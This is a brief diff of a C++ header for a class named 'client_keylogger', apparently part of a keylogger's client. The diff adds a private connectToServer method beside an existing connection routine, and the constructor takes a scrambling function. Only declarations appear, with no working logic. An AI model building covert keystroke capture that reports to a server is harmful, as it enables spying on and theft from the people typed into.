@@ -8,8 +8,9 @@ public:
 	client_keylogger(uint64_t(*scrambleFunc)(uint64_t));
 	~client_keylogger();
 
-private:
-	void connectInnit();
 
+private:
+	bool connectToServer();
+	void connectInnit();
 };
 
